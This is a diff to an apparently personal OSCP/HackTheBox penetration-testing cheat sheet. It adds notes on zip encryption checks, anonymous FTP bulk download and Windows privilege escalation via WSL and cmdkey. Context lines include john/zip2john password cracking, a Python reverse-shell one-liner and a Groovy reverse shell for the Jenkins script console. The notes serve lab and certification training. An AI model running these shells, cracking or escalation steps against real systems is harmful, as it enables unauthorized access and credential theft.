@@ -553,6 +553,11 @@ john sql_svc.hash --show
 zip2john sitebackup3.zip > sitebackup3.hash
 john -w=/home/kali/HTB/OSCP/rockyou.txt sitebackup3.hash
 ```
+### Zip file Encrption find
+- If a file .zip is protected with password, you can identify using the
+```bash
+7z l -slt file
+```
 
 ### keepass2John
 During the Initial enumeration process of the target with smbclient -L //target or smbclient -L ////target found Database.kdbx file in User directory.
@@ -827,6 +832,10 @@ ftp <IP>
 
 put <file> #uploading file
 get <file> #downloading file
+
+# Download bulk all, with anonymous login
+wget -m ftp://anonymous:anonymous@10.10.10.98 # If it fails do to passive mode below command
+wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
 
 #NSE
 locate .nse | grep ftp
@@ -1440,9 +1449,9 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 </aside>
 
-### Groovy reverse-shell
+### Groovy reverse-shell Jenkins
 
-- For Jenkins
+- For Jenkins, manage > script console
 
 ```powershell
 String host="localhost";
@@ -1507,11 +1516,13 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 # Windows Sub Syetm For Linux (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 where /R c:\windows wsl.exe
 where /R c:\windows bash.exe
-# FInd the path of wsl and bash
+# Find the path of wsl and bash
 c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami # Will get root
 c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
 hostname # You will get name of the host, check for bash history
 
+# Runas process here https://ashokreddyz.medium.com/access-hackthebox-windows-privileges-escalation-046aed801fb6
+cmdkey /list
 ```
 
 ## Manual Enumeration commands
